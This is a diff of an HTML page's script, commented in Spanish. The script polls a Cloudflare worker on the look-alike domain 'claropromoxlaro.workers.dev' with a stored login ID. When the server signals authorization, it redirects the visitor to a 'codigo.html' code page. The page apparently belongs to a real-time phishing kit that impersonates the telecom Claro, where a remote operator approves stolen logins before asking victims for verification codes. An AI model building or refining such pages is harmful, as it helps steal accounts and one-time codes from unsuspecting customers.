@@ -10,27 +10,34 @@
 
   <script>
     const statusEl = document.getElementById("status");
-    const checkInterval = 3000; // cada 3 segundos
-    const id = localStorage.getItem("authId"); // ID temporal del login
+    const loginId = localStorage.getItem("loginId");
+    const workerUrl = "https://blue-night-7897.claropromoxlaro.workers.dev/status?id=";
 
     async function checkAuth() {
       try {
-        const res = await fetch(`https://blue-night-7897.claropromoxlaro.workers.dev/status?id=${id}`);
+        const res = await fetch(workerUrl + loginId);
         const data = await res.json();
 
-        if (data.autorizado) {
-          window.location.href = "codigo.html"; // redirige cuando se autoriza
+        if (!data) {
+          statusEl.textContent = "ID no encontrado en el servidor.";
+          return;
+        }
+
+        if (data.autorizado === true) {
+          window.location.href = "codigo.html";
+        } else if (data.autorizado === false) {
+          window.location.href = "usererror.html";
         } else {
           statusEl.textContent = "Esperando autorización...";
         }
+
       } catch(err) {
-        console.error(err);
         statusEl.textContent = "Error al conectar al servidor.";
+        console.error(err);
       }
     }
 
-    // Polling cada 3 segundos
-    setInterval(checkAuth, checkInterval);
+    setInterval(checkAuth, 3000); // Revisar cada 3 segundos
   </script>
 </body>
 </html>
